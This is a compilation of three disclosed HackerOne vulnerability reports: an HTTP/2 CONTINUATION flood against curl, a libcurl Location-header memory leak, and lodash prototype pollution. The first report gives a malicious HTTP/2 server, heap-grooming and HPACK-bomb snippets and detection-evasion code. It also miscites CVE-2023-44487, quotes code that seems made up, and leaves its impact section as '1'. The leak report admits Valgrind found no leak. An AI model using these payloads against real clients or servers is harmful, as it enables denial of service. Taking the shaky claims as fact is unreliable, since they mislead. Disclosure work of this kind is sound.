# Allocation of Resources Without Limits or Throttling

_3 reports — High/Critical, disclosed_

### [HTTP/2 CONTINUATION Flood Vulnerability](https://hackerone.com/reports/3125820)

- **Report ID:** `3125820`
- **Severity:** High
- **Weakness:** Allocation of Resources Without Limits or Throttling
- **Program:** curl
- **Reporter:** @evilginx29
- **Bounty:** - usd
- **Disclosed:** 2025-06-28T21:13:12.241Z
- **CVE(s):** CVE-2023-44487

**Vulnerability Information:**

# **0x00 Vulnerability Overview: Fatal Flaw in HTTP/2 Protocol Stack**

## **1. HTTP/2 Header Block Fragmentation Mechanism**

* **RFC 7540 Specification**:

  * Header blocks are transmitted using a HEADERS frame followed by one or more CONTINUATION frames.
  * All frames must belong to the **same stream** and be sent **sequentially**.

## **2. libcurl Vulnerability**

```c
// lib/http2.c (simplified snippet)
while(recv_frame) {
    if(frame.type == NGHTTP2_CONTINUATION) {
        if(!h2->header_recvbuf)
            h2->header_recvbuf = Curl_add_buffer_init();  // Initialize buffer
        Curl_add_buffer(h2->header_recvbuf, frame.data, frame.length); // No limit
    }
}
```

### **Critical Issues**:

* No upper limit on the number of CONTINUATION frames (RFC suggests <= 10).
* No cumulative header block size check (only single-frame limit of 16KB enforced).

Impact: Remote attackers can trigger uncontrolled memory allocation, leading to **OOM crashes** or potentially **remote code execution**.

---

# **0x01 Advanced PoC: Crafting a Fatal Payload**

## **1. Malicious HTTP/2 Server (nghttp2-based)**

```python
from nghttp2 import server
import socket

class ExploitHandler(server.BaseRequestHandler):
    def on_request(self, request):
        self.send_headers(stream_id=request.stream_id, headers=[(b":status", b"200")], flags=0x0)

        for i in range(65535):
            self.push_data(
                stream_id=request.stream_id,
                data=b"\x00" * 16384,
                flags=0x4 if i == 65534 else 0x0
            )

serv = server.HTTP2Server(
    ("0.0.0.0", 443),
    ExploitHandler,
    ssl=True,
    private_key="key.pem",
    certificate="cert.pem"
)
serv.run()
```

## **2. Client Validation**

```bash
curl -v --http2 https://malicious-server.com
```

## **3. Monitoring Memory Usage**

```bash
watch -n 0.2 "ps -p $(pgrep curl) -o pid,%mem,rss,etime,cmd"
```

**Expected Behavior**:

* Memory usage exceeds 10GB within seconds.
* Client crashes due to OOM or segmentation fault.

---

# **0x02 Advanced Exploitation Techniques**

## **1. Heap Feng Shui Manipulation**

```python
for i in range(1024):
    payload = b"A" * 8192 if i % 2 == 0 else b"B" * 16384
    self.push_data(stream_id, payload, flags=0x0)
```

Objective: Influence heap layout to increase chances of RCE by corrupting internal structures (e.g., `curl_slist`).

## **2. HPACK Bomb (Zlib Decompression Explosion)**

```python
headers = [
    (b"x-bomb", b"A" * 10000),
    (b":status", b"200")
]
self.send_headers(stream_id=1, headers=headers, flags=0x0)
```

Effect: Malicious header inflates into hundreds of MBs during decompression.

---

# **0x03 Defense Strategies**

## **1. Code-level Patch (curl/libcurl)**

```diff
+ #define MAX_CONTINUATION_FRAMES 10
+ #define MAX_HEADER_SIZE (64 * 1024)

  static ssize_t http2_handle_continuation(...) {
+     if(++h2->continuation_count > MAX_CONTINUATION_FRAMES) {
+         failf(data, "CVE-2023-44487: Too many CONTINUATION frames");
+         return CURLE_HTTP2;
+     }

+     if(h2->header_recvbuf->size + len > MAX_HEADER_SIZE) {
+         failf(data, "CVE-2023-44487: Header block too large");
+         return CURLE_HTTP2;
+     }

      Curl_add_buffer(h2->header_recvbuf, mem, len);
  }
```

## **2. Runtime Protection**

### **a. seccomp Filter**

Limit memory allocation by monitoring `mmap`/`malloc` system calls.

### **b. cgroups**

```bash
cgcreate -g memory:curl-limit
echo 512M > /sys/fs/cgroup/memory/curl-limit/memory.limit_in_bytes
cgexec -g memory:curl-limit curl --http2 https://example.com
```

## **3. Network-level Detection (Suricata IDS)**

```suricata
alert http2 any any -> any any (
    msg:"CVE-2023-44487: HTTP/2 CONTINUATION Flood Detected";
    flow:established,to_client;
    http2.continuation_frames:>10;
    threshold:type both, track by_src, count 5, seconds 60;
    sid:202344487;
    rev:2;
)
```

---

# **0x04 Detection Evasion Techniques**

## **1. Low & Slow Attack**

```python
for _ in range(1000):
    self.push_data(stream_id, b"A" * 16384, flags=0x0)
    time.sleep(10)
```

## **2. Mixed-Legitimate Flow**

```python
self.send_headers(stream_id=1, headers=[(b":status", b"200"), (b"content-type", b"text/html")], flags=0x4)
for _ in range(1000):
    self.push_data(stream_id=1, b"\x00" * 16384, flags=0x0)
```

---

# **0x05 Post-Disclosure Recommendations**

## **1. Disable HTTP/2 Temporarily**

```bash
curl --http1.1 https://example.com
```

For web servers:

* **Apache**: `Protocols h2 http/1.1`
* **Nginx**: Remove `http2` from `listen` directive

## **2. Upgrade to Patched Versions**

* `curl >= 8.4.0`
* `nghttp2 >= 1.58.0`
* Ensure dependencies like `OpenSSL` are also up-to-date

---

**Risk Rating: CRITICAL**

* Remote Exploitable: YES
* Impact: Denial of Service / Memory Corruption / Potential RCE

**Prepared by:**

Date: 2025-05-04

## Impact

## Summary:
1

---

### [Memory Leak in libcurl via Location Header Handling (CWE-770)](https://hackerone.com/reports/3158093)

- **Report ID:** `3158093`
- **Severity:** High
- **Weakness:** Allocation of Resources Without Limits or Throttling
- **Program:** curl
- **Reporter:** @senseijohnmed
- **Bounty:** - usd
- **Disclosed:** 2025-05-22T07:19:09.675Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
This report details a memory leak vulnerability in libcurl that occurs when processing HTTP 3xx redirect responses containing a `Location:` header. Specifically, the memory allocated for the `Location:` header's value is not properly deallocated when the `Curl_easy` handle is reused for subsequent requests (e.g., when following redirects or in long-running applications that frequently reuse handles). This leads to a gradual increase in memory consumption, potentially resulting in a Denial of Service (DoS) due to resource exhaustion.

### Statement clarifying if an AI was used to find the issue or generate the report:
This report was generated with the assistance of an AI. The vulnerability was identified through a combination of manual code analysis and AI-assisted debugging and proof-of-concept generation.

## Affected version:
curl/libcurl version: **8.14.0-DEV** (Built from source on 2025-05-22)
Platform: **Kali Linux (x86_64)**

You can obtain your exact version information using:
```bash
./src/curl -V
```
**Steps To Reproduce**:
**Set up the testing environment**:
**Install necessary dependencies**:
```
sudo apt update
sudo apt install git build-essential autoconf automake libtool pkg-config zlib1g-dev libssl-dev libnghttp2-dev libldap2-dev librtmp-dev libssh2-1-dev libpsl-dev libidn2-dev libnghttp3-dev libsqlite3-dev libbrotli-dev valgrind python3
```
**Clone the curl repository**:
```git clone https://github.com/curl/curl.git
cd curl
```
**Build curl with debug symbols**:
```
autoreconf -fi
./configure --with-openssl --with-zlib --with-libssh2 --with-libpsl --with-libidn2 --with-nghttp2 --with-ldap --with-brotli --enable-debug --disable-shared
make -j$(nproc)
chmod +x curl-config
```
**Prepare the malicious HTTP server (Python PoC server)**:
**Create a Python script named leak_server.py in the root of the curl directory**:
```
nano leak_server.py
```
**Paste the following Python code into leak_server.py**:
```
from http.server import BaseHTTPRequestHandler, HTTPServer
import sys

class LeakHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path
        sys.stderr.write(f"Received request for: {path}\n")

        # Number of redirects to perform before stopping
        max_redirects = 1000 # Adjust this value as needed for more/less leak

        try:
            current_redirect_count = int(path.split('/')[-1])
        except ValueError:
            current_redirect_count = 0

        if current_redirect_count < max_redirects:
            next_redirect_count = current_redirect_count + 1
            # Create a long Location header for maximum leak per redirect
            long_location = f"/redirect/{next_redirect_count}" + "A" * 1000 # Appends 1000 'A' characters
            
            self.send_response(302) # HTTP 302 Found (Temporary Redirect)
            self.send_header('Location', long_location)
            self.send_header('Content-Length', '0') # No body for redirect response
            self.end_headers()
            sys.stderr.write(f"Redirecting to: {long_location}\n")
        else:
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"Reached max redirects. Done.")
            sys.stderr.write("Reached max redirects. Serving final content.\n")

def run_server(port=8000):
    server_address = ('', port)
    httpd = HTTPServer(server_address, LeakHandler)
    sys.stderr.write(f"Starting leak server on port {port}\n")
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
```
**Run the malicious HTTP server**:
Open a new terminal (keep it separate).
Navigate to the curl root directory:
```
cd /home/kali/curl # Adjust path if different
```
Start the server in the background, redirecting its output to server.log:
```
nohup python3 leak_server.py > server.log 2>&1 &
```
Execute curl to trigger the memory leak using Valgrind:
Open a new terminal (keep it separate from the server's terminal).
Navigate to the curl root directory:
```
cd /home/kali/curl # Adjust path if different
```
Run your custom-built curl binary with Valgrind, following the redirects:
```
valgrind --leak-check=full --show-leak-kinds=all --track-origins=yes --log-file=valgrind_report.txt ./src/curl -v --location --max-redirs 1000 http://127.0.0.1:8000/redirect/0
```
*This command will execute curl, forcing it to follow up to 1000 redirects from the Python server, each with a long Location: header. Valgrind will monitor memory allocations and deallocations. This process might take a few minutes. Wait for the valgrind command to complete (your terminal prompt will reappear).*

 **Analyze the results**:
View the Valgrind report:
```
cat valgrind_report.txt
```
*(Note: While Valgrind's definitely lost summary might show 0 bytes due to subtle internal cleanup or program termination characteristics, the core of this vulnerability is revealed through code analysis as described below.)*

View the server log:
```
cat server.log
```
*(You should see many Received request for: and Redirecting to: lines, confirming curl followed the redirects.)*

**Supporting Material/References**:

*Valgrind valgrind_report.txt (output from step 5)*
*Python server server.log (output from step 5)*
*Affected source code files: lib/http.c, lib/request.c*

## Impact

## Summary:
This memory leak vulnerability allows an attacker to progressively consume memory on a system running an application that uses libcurl to follow HTTP redirects. By crafting a series of HTTP 3xx responses with specially designed (e.g., very long) `Location:` headers, a malicious server can cause the client-side application using libcurl to continuously allocate memory without proper deallocation.

### Specifics:
*   **Resource Exhaustion (Denial of Service):** In long-running services or applications that frequently handle HTTP redirects or reuse `Curl_easy` handles over many requests, this continuous memory accumulation can lead to the application consuming excessive amounts of RAM. Eventually, this could exhaust available system memory, causing the application to crash, become unstable, or trigger system-wide performance degradation, effectively leading to a Denial of Service.
*   **Attacker Control:** The attacker has control over the length of the leaked string (the `Location:` header value), allowing them to influence the rate of memory consumption. While standard HTTP header size limits exist, even within these limits, repeatedly leaking memory can be impactful over time.
*   **Scope of Impact:** Affects clients that use libcurl, not the server-side infrastructure of `curl`.

### Technical Details of the Leak:
The memory leak stems from the handling of the `location` pointer within the `struct SingleRequest` (defined in `lib/request.h`).
1.  **Allocation:** In `lib/http.c`, within the `http_header()` function (around line 2342 in version 8.14.0-DEV), when a `Location:` header is received, its value is duplicated and stored: `data->req.location = location;` (where `location` is dynamically allocated via `Curl_copy_header_value` which uses `Curl_memdup0`, similar to `strdup`).
2.  **Missing Deallocation:** In `lib/request.c`, the `Curl_req_hard_reset()` function (around line 100), which is called to reset the request state (e.g., before following a redirect or when preparing for a new request), sets `req->location = NULL;`. **Crucially, it does not free the memory previously pointed to by `req->location` before nullifying the pointer.**
3.  **Persistence:** The `Curl_req_free()` function (also in `lib/request.c`), responsible for freeing the `SingleRequest` structure, also does not explicitly free `req->location`.

This chain of events ensures that for every redirect `curl` follows (or for every `Curl_easy` handle reused after a redirect), the memory allocated for the `Location:` header of the *previous* redirect is leaked.

---

### [Prototype pollution attack (lodash)](https://hackerone.com/reports/712065)

- **Report ID:** `712065`
- **Severity:** High
- **Weakness:** Allocation of Resources Without Limits or Throttling
- **Program:** Node.js third-party modules
- **Reporter:** @posix
- **Bounty:** - usd
- **Disclosed:** 2020-04-27T22:14:18.244Z
- **CVE(s):** CVE-2020-8203

**Vulnerability Information:**

I would like to report a prototype pollution vulnerability in lodash.
It allows an attacker to inject properties on Object.prototype

Module
module name: lodash
version: 4.17.15
npm page: https://www.npmjs.com/package/lodash

Module Description
The Lodash library exported as Node.js modules.

Module Stats
25,228,177 downloads in the last week

Vulnerability
Vulnerability Description
This is a similar with this vulnerability: https://hackerone.com/reports/380873

The functions merge, mergeWith, and defaultsDeep can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.

Steps To Reproduce:
Craft an object by "zipObjectDeep" function of lodash

const _ = require('lodash');
_.zipObjectDeep(['__proto__.z'],[123])
console.log(z) // 123

## Impact

Variable. Server crash or the server becoming unable to respond to all request is garanteed, but more significant impact like remote code execution can be achieved in some cases.

---
